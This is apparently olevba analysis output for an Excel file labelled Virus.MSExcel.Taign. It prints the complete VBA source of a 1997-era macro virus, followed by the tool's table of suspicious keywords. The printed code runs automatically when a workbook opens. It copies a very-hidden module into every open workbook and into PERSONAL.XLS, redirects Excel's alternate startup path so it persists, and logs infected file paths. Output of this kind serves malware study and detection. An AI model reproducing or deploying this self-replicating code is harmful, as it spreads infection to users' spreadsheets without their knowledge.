olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Taign-c77699d149ba877d733a3d927c05b387c8c58330 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




























































































































































































































Public closed
Sub Auto_Open()
Application.ScreenUpdating = False
Application.DisplayAlerts = False
On Error GoTo Err
If Dir("C:\MSOFFICE", vbDirectory) = "" Then MkDir "C:\MSOFFICE"
If Dir("C:\MSOFFICE\EXCEL", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL"
If Dir("C:\MSOFFICE\EXCEL\XLSTART", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART"
If Dir("C:\MSOFFICE\EXCEL\XLSTART\ALT", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART\ALT"
Application.AltStartupPath = "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
Application.OnSheetActivate = ""
Application.OnWindow = ""
If TypeName(Application.Caller) = "String" Then
For c = 1 To Len(Application.Caller)
If Mid(Application.Caller, c, 1) = "[" Then start = c + 1
If Mid(Application.Caller, c, 1) = "]" Then Length = c - start
Next c
If start = 0 Then
Source = Application.Caller
Else
Source = Mid(Application.Caller, start, Length)
End If
issrcVisible = Workbooks(Source).Windows(1).Visible
activewb = ActiveWorkbook.Name
selectsh = ActiveSheet.Name
PersExist = 0
For wb = 1 To Application.Workbooks.Count
If (Workbooks(wb).Name = "PERSONAL.XLS") Then PersExist = wb
exist = 0
For sh = 1 To Workbooks(wb).Modules.Count
If Workbooks(wb).Modules(sh).Name = " " Then
exist = 1
If Workbooks(wb).Modules(sh).Visible = True And Workbooks(wb).Windows(1).Visible = True And Workbooks(wb).ProtectWindows = False Then Workbooks(wb).Modules(sh).Visible = False
End If
Next sh
If exist = 0 And Workbooks(wb).ProtectWindows = False And Workbooks(wb).ReadOnly = False Then
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
iswbSaved = Workbooks(wb).Saved
iswbVisible = Workbooks(wb).Windows(1).Visible
Workbooks(wb).Windows(1).Visible = True
If Workbooks(wb).Modules.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).Modules(1)
ElseIf Workbooks(wb).DialogSheets.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).DialogSheets(1)
Else
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).Worksheets(1)
End If
Workbooks(wb).Modules(" ").Visible = xlVeryHidden
Workbooks(wb).Windows(1).Visible = iswbVisible
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
If iswbSaved = True Then Workbooks(wb).Save
End If
Open "c:\windows\system\info.doc" For Append As #1
Print #1, Time$ & "," & Date$ & "," & Workbooks(Source).Path & "\" & Workbooks(Source).Name & "," & Workbooks(wb).Path & "\" & Workbooks(wb).Name
Close
Next wb
If PersExist <> 0 Then
If Workbooks(PersExist).ProtectWindows = False And Workbooks(PersExist).ReadOnly = False Then
fp = 0
For sh = 1 To Workbooks(PersExist).Modules.Count
If Workbooks(PersExist).Modules(sh).Name = " " Then fp = 1
Next sh
If fp = 0 Then
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
iswbVisible = Workbooks(PersExist).Windows(1).Visible
Workbooks(PersExist).Windows(1).Visible = True
If Workbooks(PersExist).Modules.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).Modules(1)
ElseIf Workbooks(PersExist).DialogSheets.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).DialogSheets(1)
Else
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).Worksheets(1)
End If
Workbooks(PersExist).Modules(" ").Visible = xlVeryHidden
Workbooks(PersExist).Windows(1).Visible = iswbVisible
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
Open "c:\windows\system\info.doc" For Append As #1
Print #1, Time$ & "," & Date$ & "," & Workbooks(Source).Path & "\" & Workbooks(Source).Name & "," & Workbooks(PersExist).Path & "\" & Workbooks(PersExist).Name
Close
End If
End If
Else
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
Workbooks(Source).Sheets(" ").Copy
Modules.Add
ActiveWorkbook.Modules(" ").Visible = xlVeryHidden
newpers = ActiveWorkbook.Name
Workbooks(newpers).Windows(1).Visible = False
Workbooks(newpers).SaveAs FileName:=Application.AltStartupPath & "\PERSONAL.XLS"
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
End If
If Not Workbooks("PERSONAL.XLS").Saved Then Workbooks("PERSONAL.XLS").Save
End If
Workbooks(activewb).Activate
Sheets(selectsh).Select
Err:
Auto_New
End Sub
Sub Auto_Close()
On Error GoTo Err
If TypeName(Application.Caller) = "String" Then
For c = 1 To Len(Application.Caller)
If Mid(Application.Caller, c, 1) = "[" Then start = c + 1
If Mid(Application.Caller, c, 1) = "]" Then Length = c - start
Next c
If start = 0 Then
Source = Application.Caller
Else
Source = Mid(Application.Caller, start, Length)
End If
closed = 1
Workbooks(Source).RunAutoMacros (xlAutoOpen)
End If
If Not Workbooks("PERSONAL.XLS").Saved Then Workbooks("PERSONAL.XLS").Save
closed = 0
Err:
End Sub
Sub Auto_New()
Application.ScreenUpdating = False
On Error GoTo Err
fp = 0
For sh = 1 To Workbooks("PERSONAL.XLS").Modules.Count
If Workbooks("PERSONAL.XLS").Modules(sh).Name = " " Then fp = 1
Next sh
If fp = 1 Then
Application.OnSheetActivate = "PERSONAL.XLS!Auto_New"
Application.OnWindow = "PERSONAL.XLS!Auto_New"
ElseIf closed = 0 Then
Application.OnSheetActivate = "Auto_New"
Application.OnWindow = "Auto_New"
End If
For sh = 1 To ActiveWorkbook.Modules.Count
If ActiveWorkbook.Modules(sh).Name = " " Then Sheets(" ").Visible = False
Next sh
Workbooks("PERSONAL.XLS").Windows(1).Visible = False
If Dir("C:\MSOFFICE", vbDirectory) = "" Then MkDir "C:\MSOFFICE"
If Dir("C:\MSOFFICE\EXCEL", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL"
If Dir("C:\MSOFFICE\EXCEL\XLSTART", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART"
If Dir("C:\MSOFFICE\EXCEL\XLSTART\ALT", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART\ALT"
Application.AltStartupPath = "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
Err:
End Sub






































'Well I'd call that a work of art....
'December 1997. Hello Teign School!


















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
